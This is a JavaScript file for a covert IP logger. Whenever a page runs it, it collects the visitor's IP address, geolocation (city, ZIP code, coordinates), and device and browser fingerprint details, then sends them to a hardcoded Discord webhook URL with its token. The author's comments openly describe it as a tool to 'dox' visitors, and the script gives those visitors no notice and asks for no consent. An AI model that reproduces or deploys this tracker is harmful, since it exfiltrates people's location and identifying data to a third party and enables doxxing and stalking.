var WebhookUrl = 'https://discord.com/api/webhooks/1411029247568642178/MuVbmh419YS8daEbUWELb46OjBpe4N1u2FxJ8vmHXGTHjPBqOzOfxr1bGgJNTcAQVBLO'; //discord url DUH

var request = new XMLHttpRequest();
request.open("POST", WebhookUrl);
request.setRequestHeader('Content-type', 'application/json'); //basically just set up the post request for the webhook

(async () => {
  try {
    const IPresponse = await fetch('https://api.ipify.org?format=json');
    const IPdata = await IPresponse.json();
    const userIP = IPdata.ip; //get your ip with ipify cuz im retarded and dont know how to normally

    const dataResponse = await fetch(`/api/geo?ip=${userIP}`); //ermm when you enter the website it will send you ip to ipapi and ipapi will say hmm yes okay thats very hot now let me dox you rq
    const data = await dataResponse.json();

    const success = true; // you shouldnt do this im just lazy to change it i was debugging

    if (success === true) { // you shouldnt do this im just lazy to change it i was debugging

      const windowWidth = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth
      const windowHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
      const Payload = { // the whole payload thing is what you send to the webhook and the webhook will say hmm yes okay okay okay i will tell discord daddy to go send a message yes okay bye
        username: window.location.href.slice(0,256), //username DUUUHH
        embeds: [
          {
            title: 'IP fetch',
            description: 'new IP log',
            fields: [
              {
                name: 'IP Address',
                value: userIP,
                inline: true
              },
              {
                name: 'Current Time',
                value: getCurrentTime(),
                inline: true
              },
              {
                name: 'IP Type',
                value: 'IPv' + data.ipVersion,
                inline: true
              },
              {
                name: 'Continent Code',
                value: data.continentCode,
                inline: true
              },
              {
                name: 'Continent Name',
                value: data.continent,
                inline: true
              },
              {
                name: 'Country Code',
                value: data.countryCode,
                inline: true
              },
              {
                name: 'Country Name',
                value: data.countryName,
                inline: true
              },
              {
                name: 'City',
                value: data.cityName,
                inline: true
              },
              {
                name: 'Flag',
                value: getCountryFlag(data.countryCode),
                inline: true
              },
              {
                name: 'Latitude/Longitude',
                value: data.latitude + '/' + data.longitude,
                inline: true
              },
              {
                name: 'ZIP Code',
                value: data.zipCode,
                inline: true
              },
              {
                name: 'Is Proxy?',
                value: data.isProxy,
                inline: true
              },
              {
                name: 'Timezone',
                value: data.timeZone,
                inline: true
              },
              {
                name: 'Window Width/Height',
                value: windowWidth + 'px / ' + windowHeight + 'px',
                inline: true
              },
              {
                name: 'Screen Width',
                value: window.screen.availWidth + 'px / ' + window.screen.availHeight + 'px',
                inline: true
              },
              {
                name: 'Color Depth',
                value: window.screen.colorDepth,
                inline: true
              },
              {
                name: 'OS',
                value: navigator.platform,
                inline: true
              },
              {
                name: 'Threads',
                value: navigator.hardwareConcurrency,
                inline: true
              },
              //{
              //  name: 'Memory',
              //  value: navigator.deviceMemory,
              //  inline: true
              //},
              {
                name: 'Languages',
                value: navigator.language,
                inline: true
              },
              {
                name: 'Device',
                value: getDeviceType(),
                inline: true
              },
              {
                name: 'User Agent',
                value: navigator.userAgent.slice(0, 1024), //discord has a limit of 1024 characters for field values
                inline: true
              },
            ],
          }
        ]
      };
      request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!

    } else {
      console.error('status: ', data.status, ' message: ', data.message); //if error then dont explode
    }
  } catch (error) {
    console.error('erm merror: ', error);//if error then dont explode #2
  }
})();

function getCountryFlag(countryCode) {
  const base = 127397;
  const countryCodeChars = countryCode.toUpperCase().split("");

  const flagEmoji = countryCodeChars
    .map((char) => String.fromCodePoint(base + char.charCodeAt(0)))
    .join("");

  return flagEmoji;
}

function getDeviceType() {
  if (navigator.maxTouchPoints && window.matchMedia("(any-pointer:coarse)").matches) {
    return "Mobile";
  } else {
    return "PC";
  }
}

function getCurrentTime() {
  const now = new Date();
  let hours = now.getHours();
  let minutes = now.getMinutes();
  let amPm = hours >= 12 ? "PM" : "AM";

  hours = hours % 12 || 12;
  minutes = minutes < 10 ? "0" + minutes : minutes;

  return `${hours}:${minutes} ${amPm}`;
}